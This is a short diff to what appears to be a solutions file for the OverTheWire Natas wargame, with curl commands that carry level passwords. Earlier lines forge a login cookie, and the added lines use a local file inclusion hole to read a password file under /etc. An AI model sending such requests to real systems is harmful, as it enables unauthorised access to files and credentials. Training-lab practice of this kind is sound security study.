@@ -14,3 +14,7 @@ curl --silent --user natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq --cookie loggedin=1
 
 curl --silent --user natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 http://natas6.natas.labs.overthewire.org/includes/secret.inc
 curl --silent --user natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 --request POST --form 'submit=1' --form 'secret=FOEIUWGHFEEUHOFUOIU' http://natas6.natas.labs.overthewire.org
+
+curl --silent --user natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+
+natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
